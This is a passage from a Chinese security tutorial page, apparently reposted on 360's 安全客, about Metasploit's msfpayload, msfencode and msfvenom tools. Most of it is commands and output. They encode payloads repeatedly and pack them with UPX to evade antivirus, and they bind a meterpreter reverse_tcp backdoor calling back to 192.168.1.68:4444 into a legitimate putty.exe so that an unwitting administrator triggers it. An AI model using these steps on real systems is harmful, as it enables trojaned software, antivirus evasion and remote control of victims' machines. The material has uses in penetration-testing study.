]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;308&nbsp;(iteration=1)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;335&nbsp;(iteration=2)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;362&nbsp;(iteration=3)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;389&nbsp;(iteration=4)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;416&nbsp;(iteration=5)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;443&nbsp;(iteration=6)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;470&nbsp;(iteration=7)
[*]&nbsp;x86/bloxor&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;547&nbsp;(iteration=1)
[*]&nbsp;x86/bloxor&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;617&nbsp;(iteration=2)
[*]&nbsp;x86/bloxor&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;677&nbsp;(iteration=3)
[*]&nbsp;x86/countdown&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;695&nbsp;(iteration=1)
[*]&nbsp;x86/countdown&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;713&nbsp;(iteration=2)
[*]&nbsp;x86/countdown&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;731&nbsp;(iteration=3)
[*]&nbsp;x86/countdown&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;749&nbsp;(iteration=4)
[*]&nbsp;x86/countdown&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;767&nbsp;(iteration=5)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">最后生成av.exe,这里我们可以测试一下生成的exe是否可以正常运行，丢到windows里面运行一下，请自行测试，我就不截图了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">如果运行正常，还不放心杀毒软件会干掉，那么我们再用upx加个壳？</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;upx&nbsp;-5&nbsp;av.exe
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ultimate&nbsp;Packer&nbsp;for&nbsp;eXecutables
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;1996&nbsp;-&nbsp;2013UPX&nbsp;3.91&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Markus&nbsp;Oberhumer,&nbsp;Laszlo&nbsp;Molnar&nbsp;&amp;&nbsp;John&nbsp;Reiser&nbsp;&nbsp;&nbsp;Sep&nbsp;30th&nbsp;2013
File&nbsp;size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ratio&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Format&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name
&nbsp;&nbsp;&nbsp;--------------------&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;73802&nbsp;-&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48128&nbsp;&nbsp;&nbsp;65.21%&nbsp;&nbsp;&nbsp;&nbsp;win32/pe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;av.exe
Packed&nbsp;1&nbsp;file.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这种的生成的payload运行之后，没有什么反应，如果是作为渗透者自己来用的话，可能会做的比较隐蔽，有时候我们需要管理员或者目标主机上的其
他人来触发这些payload程序，那么我们就需要用到比较隐蔽和猥琐的触发方式了，用标准的官方语言说就是：建立以标准文件模版为基础的payload
文件，通俗点说就是搞个捆绑器，把shellcode我们正常的程序捆绑在一起，当管理员运行正常程序的时，就会触发我们的payload后门<br/>a.exe是一个正常的putty程序，我们把shellcode和putty捆绑在一起生成一个新的程序</span></p><p></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;
windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.68&nbsp;LPORT=4444&nbsp;R&nbsp;|&nbsp;
msfencode&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-c&nbsp;3&nbsp;-t&nbsp;exe&nbsp;-k&nbsp;-x&nbsp;
/pentest/framework3/a.exe&nbsp;-o&nbsp;putty.exe[!]&nbsp;
************************************************************************[!]
&nbsp;
************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;308&nbsp;(iteration=1)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;335&nbsp;(iteration=2)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;362&nbsp;(iteration=3)</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">可以看到我们生成了新的putty.exe，只需要替换掉原来的putty.exe即可，当管理员运行我们加工后的putty.exe时，就会触发我们的后门。</span><br/></p><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">前面提到了，我们要对原本已经有的，比如通过其他的木马生成器生成的木马服务端进行免杀，那我们同样可以使用这样的模式来进行免杀，看实际的操作例子，这里的a是我们原始的putty文件，payload是我们生成的木马服务端，通过捆绑免杀，生成新的putty.exe<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfencode&nbsp;-i&nbsp;
/pentest/framework3/payload.exe&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-c&nbsp;5&nbsp;-x&nbsp;-k&nbsp;
/pentest/framework3/a.exe&nbsp;-o&nbsp;putty.exe[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;73831&nbsp;(iteration=1)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;73860&nbsp;(iteration=2)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;73889&nbsp;(iteration=3)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;73918&nbsp;(iteration=4)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;73947&nbsp;(iteration=5)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">接下来介绍msfvenom，msfvenom兼顾了msfencode和msfpayload的功能，所以将逐步替代msfencode和msfpayload，先看下参数</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfvenom&nbsp;-hUsage:&nbsp;/usr/local/bin/msfvenom&nbsp;[options]
Options:
&nbsp;&nbsp;&nbsp;&nbsp;-p,&nbsp;--payload
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload&nbsp;to&nbsp;use.&nbsp;Specify&nbsp;a&nbsp;&#39;-&#39;&nbsp;or&nbsp;stdin&nbsp;to&nbsp;use&nbsp;custom&nbsp;payloads
&nbsp;&nbsp;&nbsp;&nbsp;-l,&nbsp;--list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[module_type]&nbsp;&nbsp;&nbsp;List&nbsp;a&nbsp;module&nbsp;type&nbsp;example:&nbsp;payloads,&nbsp;encoders,&nbsp;nops,&nbsp;all
&nbsp;&nbsp;&nbsp;&nbsp;-n,&nbsp;--nopsled&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Prepend&nbsp;a&nbsp;nopsled&nbsp;of&nbsp;[length]&nbsp;size&nbsp;on&nbsp;to&nbsp;the&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;-f,&nbsp;--format
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Output&nbsp;format&nbsp;(use&nbsp;--help-formats&nbsp;for&nbsp;a&nbsp;list)
&nbsp;&nbsp;&nbsp;&nbsp;-e,&nbsp;--encoder&nbsp;&nbsp;&nbsp;&nbsp;[encoder]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;encoder&nbsp;to&nbsp;use
&nbsp;&nbsp;&nbsp;&nbsp;-a,&nbsp;--arch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;architecture&nbsp;to&nbsp;use
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--platform
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;platform&nbsp;of&nbsp;the&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;-s,&nbsp;--space&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;maximum&nbsp;size&nbsp;of&nbsp;the&nbsp;resulting&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;-b,&nbsp;--bad-chars
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;list&nbsp;of&nbsp;characters&nbsp;to&nbsp;avoid&nbsp;example:&nbsp;&#39;\x00\xff&#39;
&nbsp;&nbsp;&nbsp;&nbsp;-i,&nbsp;--iterations&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;number&nbsp;of&nbsp;times&nbsp;to&nbsp;encode&nbsp;the&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;-c,&nbsp;--add-code
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;an&nbsp;additional&nbsp;win32&nbsp;shellcode&nbsp;file&nbsp;to&nbsp;include
&nbsp;&nbsp;&nbsp;&nbsp;-x,&nbsp;--template
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;a&nbsp;custom&nbsp;executable&nbsp;file&nbsp;to&nbsp;use&nbsp;as&nbsp;a&nbsp;template
&nbsp;&nbsp;&nbsp;&nbsp;-k,&nbsp;--keep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Preserve&nbsp;the&nbsp;template&nbsp;behavior&nbsp;and&nbsp;inject&nbsp;the&nbsp;payload&nbsp;as&nbsp;a&nbsp;new&nbsp;thread
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--payload-options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;the&nbsp;payload&#39;s&nbsp;standard&nbsp;options
&nbsp;&nbsp;&nbsp;&nbsp;-o,&nbsp;--out
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Save&nbsp;the&nbsp;payload
&nbsp;&nbsp;&nbsp;&nbsp;-v,&nbsp;--var-name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;a&nbsp;custom&nbsp;variable&nbsp;name&nbsp;to&nbsp;use&nbsp;for&nbsp;certain&nbsp;output&nbsp;formats
&nbsp;&nbsp;&nbsp;&nbsp;-h,&nbsp;--help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;this&nbsp;message
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--help-formats&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;available&nbsp;formats
这里我们对msfvenom的参数一一解释
-p&nbsp;—payload&nbsp;利用哪个payload来生成
-l&nbsp;—list&nbsp;列出模块类型：&nbsp;payloads，encoders,nops,all
-n&nbsp;—nopsled</pre><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 milsec<br/><a class="text-more" href="http://www.milsec.net/research_lab/87.html" target="_blank">原文链接：http://www.milsec.net/research_lab/87.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="Metasploit的模块构成及功能介绍 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="201" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
